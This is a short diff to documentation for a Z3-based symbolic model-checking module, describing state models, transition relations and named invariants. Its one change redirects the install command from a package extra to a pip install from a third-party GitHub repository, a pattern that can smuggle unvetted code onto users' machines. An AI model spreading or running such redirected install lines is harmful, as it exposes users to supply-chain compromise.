@@ -13,7 +13,7 @@ Capability label: ``implemented``.
     r.completion_state, r.recheck["passed"]             # ("blocked-escalated", True)
     prove_invariant({**counter, "invariants": {"natural": "(>= x 0)"}}).k   # 1: verdict "k_inductive", at k = 1
 
-Symbolic state models, in process with Z3 (``pip install 'g6[formal]'``; imported only when an op runs), callable over
+Symbolic state models, in process with Z3 (``pip install 'g6[formal] @ git+https://github.com/basicisabc1994/g6solver'``; imported only when an op runs), callable over
 MCP. A model is state variables with their sorts (``Int``, ``Real``, ``Bool``, ``(_ BitVec n)``), an initial condition,
 a transition relation and named invariants, all SMT-LIB terms read through g6.formal's closed grammar. The next-state
 copy of ``x`` is written ``next_x``: SMT-LIB has no prime. Ops (:mod:`g6.model_checking.symbolic`):
